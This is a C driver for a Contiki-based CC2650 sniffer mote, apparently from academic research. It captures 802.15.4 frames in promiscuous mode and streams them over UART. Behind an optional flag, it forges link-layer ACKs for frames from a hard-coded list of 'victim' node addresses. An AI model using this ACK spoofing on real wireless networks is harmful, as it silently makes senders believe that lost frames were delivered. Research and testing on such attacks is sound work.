/*
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Institute nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE INSTITUTE AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE INSTITUTE OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */
 
/**
 * \file
 *         Definition of a null RDC driver to be used with the Sniplayer mote.
 *         The sniplayer is in promiscuos mode. When it receives a frame, if the
 *         macro to forge ACKs is set, the radio is on and the sender address is in the victims list,
 *         it sends an ACK for the incoming frame. We then drop everything.
 *         This code is specific for CC2650 Launchpad platform.
 *
 * \author
 *         Dario Varano - <dario.varano@ing.unipi.it>
 */
 
#include <stdio.h>
#include "net/mac/mac.h"
#include "net/mac/rdc.h"
#include "net/rime/rime.h"
#include "net/netstack.h"
#include "sniplay.h"

#include "dev/serial-line.h"
#include "dev/uart1.h"
#define UART_WRITEB(b) cc26xx_uart_write_byte(b)

#define DEBUG 0
#if DEBUG
#include <stdio.h>
#define PRINTF(...) printf(__VA_ARGS__)
#else
#define PRINTF(...)
#endif

#ifdef NULLSNIPLAYRDC_CONF_FORGE_802154_ACK
#define NULLSNIPLAYRDC_FORGE_802154_ACK NULLSNIPLAYRDC_CONF_FORGE_802154_ACK
#else /* NULLSNIPLAYRDC_CONF_FORGE_802154_ACK */
#define NULLSNIPLAYRDC_FORGE_802154_ACK 0
#endif /* NULLSNIPLAYRDC_CONF_FORGE_802154_ACK */

#define ACK_LEN 3
#define NUM_VICTIMS 4

static const uint8_t magic[] = { 0x53, 0x6E, 0x69, 0x66 }; /* Magic Sequence */

/* Victim nodes to ack */
static const linkaddr_t victim_node8 = { { 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08 } };
static const linkaddr_t victim_node12 = { { 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c } };
static const linkaddr_t victim_node7 = { { 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07 } };
static const linkaddr_t victim_node3 = { { 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03 } };
static const linkaddr_t victim_node14 = { { 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0e } };
static const linkaddr_t victim_node16 = { { 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10 } };
static const linkaddr_t victim_node19 = { { 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13 } };

int radio_on;

/*---------------------------------------------------------------------------*/
static void
send(mac_callback_t sent, void *ptr)
{
  if(sent) {
    sent(ptr, MAC_TX_OK, 1);
  }
}
/*---------------------------------------------------------------------------*/
static void
send_list(mac_callback_t sent, void *ptr, struct rdc_buf_list *list)
{
  if(sent) {
    sent(ptr, MAC_TX_OK, 1);
  }
}
/*---------------------------------------------------------------------------*/
static void
input(void)
{
	int j;
	signed char last_rssi;
	uint8_t last_correlation;
	last_rssi = packetbuf_attr(PACKETBUF_ATTR_RSSI);
	last_correlation = packetbuf_attr(PACKETBUF_ATTR_LINK_QUALITY);

	int original_datalen;
	uint8_t *original_dataptr;
	
	original_datalen = packetbuf_datalen();
	original_dataptr = packetbuf_dataptr();

/* If the following flag is set, the mote will ack messages coming from a specific node (victim_node) */ 
#if NULLSNIPLAYRDC_FORGE_802154_ACK
		{
		frame802154_t info154;
		frame802154_parse(original_dataptr, original_datalen, &info154);
		
		if(info154.fcf.frame_type == FRAME802154_DATAFRAME &&
		info154.fcf.ack_required != 0 &&
		(linkaddr_cmp((linkaddr_t *)&info154.src_addr, &victim_node8) ||
		 linkaddr_cmp((linkaddr_t *)&info154.src_addr, &victim_node12) ||
		 linkaddr_cmp((linkaddr_t *)&info154.src_addr, &victim_node14) ||
		 linkaddr_cmp((linkaddr_t *)&info154.src_addr, &victim_node16) ||
		 linkaddr_cmp((linkaddr_t *)&info154.src_addr, &victim_node7) ||
		 linkaddr_cmp((linkaddr_t *)&info154.src_addr, &victim_node3) ||
		 linkaddr_cmp((linkaddr_t *)&info154.src_addr, &victim_node19)) &&
		(original_datalen > 3))
		{
				uint8_t ackdata[ACK_LEN] = {0, 0, 0};
				ackdata[0] = FRAME802154_ACKFRAME;
				ackdata[1] = 0;
				ackdata[2] = info154.seq;
				if (radio_on)
				{
					NETSTACK_RADIO.send(ackdata, ACK_LEN);
				}	
			}
		}
#endif /* NULLSNIPLAYRDC_FORGE_802154_ACK */

	// Write magic sequence and frame length
	UART_WRITEB(magic[0]);
	UART_WRITEB(magic[1]);
	UART_WRITEB(magic[2]);
	UART_WRITEB(magic[3]);
	UART_WRITEB(original_datalen);
	
	// Write packet
	for( j = 0 ; j < original_datalen ; ++j )
	{
		UART_WRITEB(((unsigned char*)(original_dataptr))[j]);
	}
	
	UART_WRITEB(last_rssi);
	UART_WRITEB(last_correlation);
}
/*---------------------------------------------------------------------------*/
static int
on(void)
{
  return NETSTACK_RADIO.on();
}
/*---------------------------------------------------------------------------*/
static int
off(int keep_radio_on)
{
  if(keep_radio_on) {
    return NETSTACK_RADIO.on();
  } else {
    return NETSTACK_RADIO.off();
  }
}
/*---------------------------------------------------------------------------*/
static unsigned short
cca(void)
{
  return 0;
}
/*---------------------------------------------------------------------------*/
static void
init(void)
{

  on();
  
  cc26xx_uart_set_input(serial_line_input_byte);
  serial_line_init();

}
/*---------------------------------------------------------------------------*/
const struct rdc_driver nullsniplayrdc_driver = {
    "nullsniplayrdc",
    init,
    send,
    send_list,
    input,
    on,
    off,
    cca,
};
/*---------------------------------------------------------------------------*/
